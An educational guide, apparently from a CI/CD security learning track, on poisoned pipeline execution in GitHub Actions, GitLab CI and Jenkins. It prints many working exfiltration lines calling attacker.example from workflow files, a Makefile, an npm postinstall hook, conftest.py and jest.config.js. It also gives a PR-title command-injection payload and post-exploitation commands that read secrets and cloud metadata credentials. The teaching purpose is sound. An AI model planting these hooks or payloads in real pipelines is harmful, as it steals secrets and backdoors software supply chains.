# CICD-SEC-4: Poisoned Pipeline Execution - Attack Vectors

## Table of Contents
- [Understanding PPE Attack Vectors](#understanding-ppe-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Direct PPE Vectors](#direct-ppe-vectors-d-ppe)
- [Indirect PPE Vectors](#indirect-ppe-vectors-i-ppe)
- [Public PPE Vectors](#public-ppe-vectors-3pe)
- [Post-Exploitation from the Runner](#post-exploitation-from-the-runner)
- [Chaining PPE](#chaining-ppe)

## Understanding PPE Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test. Do not exploit systems without explicit permission.

Poisoning a pipeline is not about defeating a firewall or brute-forcing a login. It is about finding a place where **content you can influence is executed by a run that holds privileges you should not have**. The attacker's job is to locate that seam—a trigger, a checkout, a script, an expression—and slip code through it.

The attacker's goal in this category is usually one of:

- Read the pipeline's secrets and tokens (cloud keys, registry tokens, `GITHUB_TOKEN`, signing keys).
- Tamper with the artifact being built so a backdoor ships downstream.
- Use the runner as a pivot into internal networks, registries, and the cloud account.

### Core Attack Flow

```
1. Recon
   |
   Read .github/workflows, .gitlab-ci.yml, Jenkinsfile in the repo
   Identify triggers, secrets usage, checkout of untrusted refs, action pins
2. Find the seam
   |
   A privileged run that executes attacker-influenceable content
   (fork PR trigger, editable Makefile/hook, injectable expression, unpinned action)
3. Inject
   |
   Malicious workflow step, script edit, crafted PR field, or poisoned action
4. Execute with privilege
   |
   Code runs as the pipeline identity, secrets in scope
5. Exfiltrate / tamper / pivot
   |
   Dump secrets, backdoor the artifact, reach cloud metadata & internal network
```

## Direct PPE Vectors (D-PPE)

In Direct PPE the attacker edits the **pipeline definition** itself. This requires a CI configuration that runs the pipeline file from a branch or PR that the attacker can create, with secrets in scope.

### 1. Malicious Workflow on Push to a Branch

If a user can push a branch and the CI runs that branch's own pipeline file with secrets, they can add a step that dumps secrets.

```yaml
# .gitlab-ci.yml pushed on an attacker-controlled branch (GitLab runs the
# branch's own file). Protected CI/CD variables may still be exposed if the
# branch is treated as protected, or if variables are not scoped.
steal:
  script:
    - env | grep -iE 'TOKEN|KEY|SECRET' | base64 | curl -s --data-binary @- https://attacker.example/x
```

**Payoff**: any variable the job can read is exfiltrated. GitLab, Jenkins multibranch, and self-managed CI that execute the branch's own definition are the classic D-PPE targets.

### 2. Jenkinsfile Edit in a Feature Branch

A multibranch Jenkins job builds every branch by running that branch's `Jenkinsfile`. A contributor who can push a branch controls the build script.

```groovy
// Jenkinsfile on an attacker branch
pipeline {
  agent any
  stages {
    stage('x') {
      steps {
        // withCredentials or global creds bound in the environment get read out
        sh 'curl -s https://attacker.example/x --data "$(printenv | base64)"'
      }
    }
  }
}
```

**Payoff**: code execution on the Jenkins agent with whatever credentials the job binds—often broad, and frequently a non-ephemeral agent.

## Indirect PPE Vectors (I-PPE)

Here the attacker **cannot change the pipeline file**, but the pipeline runs files the attacker can change. The workflow is trusted; its inputs are not. I-PPE is subtle because the malicious change lives in ordinary-looking application files.

### 3. Poisoned Build Script (Makefile / shell)

```makefile
# Trusted workflow (unchanged):
#   - run: make test

# Attacker edits the Makefile the step invokes:
test:
	@curl -s https://attacker.example/x --data "$$(env | base64 -w0)"
	@echo "tests passed"    # keep the job green to avoid suspicion
```

### 4. Package Lifecycle Hooks (npm / pip / others)

Package managers run scripts defined in the repo. A trusted `npm ci` or `npm run build` executes whatever the repo's `package.json` declares.

```json
// package.json edited in a PR
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').execSync('curl -s https://attacker.example/x -d ' + Buffer.from(JSON.stringify(process.env)).toString('base64'))\"",
    "build": "webpack"
  }
}
```

**Payoff**: `npm ci`/`npm install` triggers `preinstall`/`postinstall` automatically—no explicit build step required.

### 5. Test / Lint Config Executed as Code

Many test and lint tools load configuration files that are executable code. Running the test step executes them.

```python
# conftest.py — pytest imports and executes this automatically
import os, urllib.request, base64
data = base64.b64encode(str(dict(os.environ)).encode())
urllib.request.urlopen('https://attacker.example/x', data)
```

```javascript
// jest.config.js — executed by node when tests run
const { execSync } = require('child_process');
execSync('curl -s https://attacker.example/x -d "$(env | base64)"');
module.exports = { testEnvironment: 'node' };
```

**Payoff**: identical to D-PPE, but hidden in files a reviewer may not scrutinise as a security-critical change.

## Public PPE Vectors (3PE)

3PE is D-PPE or I-PPE triggered by a **fork pull request from an outsider**—the attacker needs no repository permissions. The GitHub Actions trigger model is where most 3PE lives.

### 6. `pull_request_target` + Checkout of Untrusted Head

The `pull_request_target` trigger runs in the *base* repository's context—with secrets and a read/write `GITHUB_TOKEN`—but is intended only for trusted automation (labelling, commenting). Checking out and running the PR's code under it hands secrets to the outsider.

```yaml
# VULNERABLE
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's fork code
      - run: npm ci        # runs attacker's lifecycle hooks WITH secrets present
      - run: npm run build # attacker controls build script
```

**Payoff**: full 3PE. Any secret referenced by the job, and the repo-scoped token, are readable by the outsider's code.

### 7. Script Injection via Untrusted Event Data

Fields an outsider controls—PR title, branch name, commit message, issue body—are interpolated directly into a shell `run:` step. GitHub expands `${{ }}` *before* the shell runs, so the value becomes part of the command.

```yaml
# VULNERABLE
- name: greet
  run: echo "PR title: ${{ github.event.pull_request.title }}"

# Attacker sets the PR title to:
#   "; curl -s https://attacker.example/x -d "$(env | base64)"; echo "
```

**Payoff**: the injected command runs with the workflow's privileges. This works even on some `pull_request` runs if the workflow later gains secrets, and is severe under `pull_request_target`.

### 8. Unpinned Third-Party Actions

An action referenced by a mutable tag or branch resolves to whatever code that reference points to *at run time*.

```yaml
# VULNERABLE — mutable references
- uses: some-org/build-action@main    # branch can be repointed
- uses: some-org/build-action@v1      # tag can be moved to new code
```

**Payoff**: if the action's repo or maintainer is compromised, or a tag is repointed, every pipeline using it executes the malicious version with that job's secrets. One compromised action can poison thousands of pipelines.

### 9. Fork PR on a Self-Hosted Runner

```yaml
# VULNERABLE — untrusted PR code on a persistent internal runner
on: [pull_request]         # or pull_request_target
jobs:
  test:
    runs-on: [self-hosted, gpu]   # long-lived host inside the network
    steps:
      - uses: actions/checkout@v4
      - run: make test        # attacker's Makefile runs on your infrastructure
```

**Payoff**: code execution on a non-ephemeral host inside the trusted network—persistence, credential harvesting, and lateral movement, not just secret theft.

## Post-Exploitation from the Runner

Once code runs in the pipeline, the runner itself is the launch point. Common next steps:

```bash
# 1. Harvest environment secrets
env | grep -iE 'TOKEN|KEY|SECRET|PASSWORD'

# 2. Read the repo-scoped token and use it against the API
curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/OWNER/REPO

# 3. Reach cloud metadata for temporary credentials (if reachable / OIDC misused)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 4. Read mounted files / caches / other jobs' artifacts on a shared runner
ls -la ~ /home/runner/work; cat ~/.docker/config.json 2>/dev/null

# 5. Tamper the artifact before it is packaged/signed/published
sed -i 's/RELEASE/BACKDOORED/' dist/app.js
```

**Payoff**: the pipeline's identity becomes the attacker's identity—toward source, registries, cloud, and the release itself.

## Chaining PPE

Individually small issues combine into full compromise:

```
Unpinned action (@main)          -> attacker compromises that action
        +
Job has broad GITHUB_TOKEN        -> injected code pushes a commit / publishes a package
        +
Same creds build & deploy         -> the backdoored artifact ships to production
        =  supply-chain compromise from one mutable reference
```

Another common chain:

```
pull_request_target + PR-head checkout  -> outsider code runs with secrets
        -> dump cloud deploy key from env
        -> assume role via metadata / stolen key
        -> pivot into the cloud account the pipeline deploys to
```

## Key Takeaways

1. **PPE is found by reading pipeline files, not by fuzzing**—triggers, checkout refs, run steps, and action pins tell the attacker exactly where the seam is.
2. **Direct, Indirect, and Public PPE are one idea**: attacker-influenced content executed by a privileged run.
3. **Fork PRs are the biggest surface**—`pull_request_target` with untrusted checkout, injectable event fields, and self-hosted runners are the recurring 3PE patterns.
4. **Indirect PPE hides in ordinary files**—Makefiles, package hooks, and test/lint configs are all executable.
5. **The runner is a pivot**—secrets, tokens, cloud metadata, and the artifact itself are all reachable once code runs.

## Next Steps

- **[Prevention Guide](prevention.md)**: Keep untrusted code away from secrets and lock down triggers
- **[Code Examples](examples.md)**: Insecure vs. secure pipelines across GitHub Actions, GitLab CI, and Jenkins
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10 lessons
- **[Practice](/practice)**: Apply what you have learned in hands-on exercises
